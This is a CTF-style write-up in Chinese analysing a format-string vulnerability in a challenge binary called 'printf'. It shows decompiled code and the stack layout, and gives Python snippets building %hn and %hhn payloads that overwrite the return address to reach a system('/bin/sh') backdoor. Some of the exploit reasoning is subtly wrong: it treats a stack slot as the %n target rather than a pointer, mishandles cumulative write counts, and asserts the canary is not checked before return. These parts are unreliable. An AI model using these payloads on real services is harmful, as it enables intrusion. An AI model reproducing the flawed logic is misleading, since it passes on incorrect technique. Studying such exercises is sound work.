# CTF PWN题目分析：printf

## 程序基本信息
- **题目名称**: printf
- **架构**: amd64-64-little  
- **保护机制**:
  - RELRO: Partial RELRO
  - Stack: Canary found (栈金丝雀保护)
  - NX: NX enabled (栈不可执行)
  - PIE: No PIE (地址固定，基址0x400000)
  - Stripped: No (符号表未剥离)

## 关键函数分析

### main函数 (0x400bd6)
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // edx
  int v4; // ecx
  int v5; // r8d
  int v6; // r9d
  char buf[104]; // [rsp+0h] [rbp-70h] BYREF
  unsigned __int64 v9; // [rsp+68h] [rbp-8h] - 这是栈金丝雀

  v9 = __readfsqword(0x28u);        // 读取栈金丝雀
  init_0(argc, argv, envp);
  puts("one printf");
  read(0, buf, 0x60uLL);            // 读取96字节到buf
  printf((unsigned int)buf, (unsigned int)buf, v3, v4, v5, v6, buf[0]); // 格式化字符串漏洞!
  return 0;
}
```

**关键点**:
1. `buf[104]` 缓冲区在 `[rsp+0h] [rbp-70h]`
2. 栈金丝雀 `v9` 在 `[rsp+68h] [rbp-8h]`
3. `read(0, buf, 0x60uLL)` 读取96字节，不会直接溢出
4. **`printf((unsigned int)buf, ...)` 存在格式化字符串漏洞！**

### back_door函数 (0x400bbe)
```c
__int64 back_door()
{
  return system("/bin/sh");
}
```

**目标**: 通过格式化字符串漏洞触发back_door函数获取shell。

## 漏洞分析

### 漏洞类型: 格式化字符串漏洞
- `printf((unsigned int)buf, ...)` 直接将用户输入作为格式化字符串
- 可以通过 `%n` 写入任意地址
- 可以通过 `%p` 或 `%x` 泄露栈内容

### 栈布局分析
```
高地址
+------------------+
|    返回地址      | [rbp+8]
+------------------+ 
|   保存的rbp      | [rbp+0]
+------------------+
|   栈金丝雀v9     | [rbp-8] = [rsp+68h]
+------------------+
|      ...         |
+------------------+
|   buf[104]       | [rbp-70h] = [rsp+0h]
+------------------+
低地址
```

## 绕过Canary的策略

### 方法1: 泄露Canary值 (推荐)
1. **泄露栈金丝雀**: 使用格式化字符串 `%p` 或 `%lx` 泄露栈上的canary值
2. **计算偏移**: buf到canary的偏移是 `0x68 - 0x0 = 104` 字节 = 13个8字节
3. **覆盖返回地址**: 用正确的canary值 + back_door地址覆盖返回地址

### 方法2: 直接修改返回地址 (更简单)
1. **利用%n写入**: 通过格式化字符串的 `%n` 直接修改栈上的返回地址
2. **无需绕过canary**: 直接修改返回地址指向back_door，程序在返回前不会检查canary

## 利用策略

### 策略1: 直接利用%n修改返回地址 (推荐)
根据确定的偏移信息：
- canary在第19个参数位置 (`AAAA%19$lx`)
- 返回地址应该在第21个参数位置

```python
# 方法1: 使用%hn写入16位
target_low = 0x0bbe   # back_door地址低16位
target_high = 0x0040  # back_door地址高16位
payload = f"%{target_high}c%22$hn%{target_low-target_high}c%21$hn"
```

### 策略2: 字节写入方法
```python
# 使用%hhn逐字节写入
addr_bytes = [0xbe, 0x0b, 0x40, 0x00]  # 0x400bbe 小端序
for i, byte_val in enumerate(addr_bytes):
    payload += f"%{byte_val}c%{21+i}$hhn"
```

## 具体利用步骤

1. **已确定偏移**: canary在第19个参数，返回地址在第21个参数
2. **目标地址**: back_door函数地址是 `0x400bbe`
3. **构造payload**: 使用 `%hn` 或 `%hhn` 写入目标地址
4. **执行利用**: 一次printf调用完成利用

## 更新的利用方法
基于确定的canary偏移 `AAAA%19$lx`，我们可以精确计算：
- buf到canary: 0x70-0x8 = 0x68 = 104字节 = 13个参数
- canary到返回地址: 0x10字节 = 2个参数
- 所以返回地址在第 19+2 = 21个参数位置

## 注意事项
- 程序无PIE保护，地址固定为 `0x400bbe`
- read()限制输入96字节，需要构造紧凑的payload
- 可以通过格式化字符串直接修改返回地址，无需绕过canary检查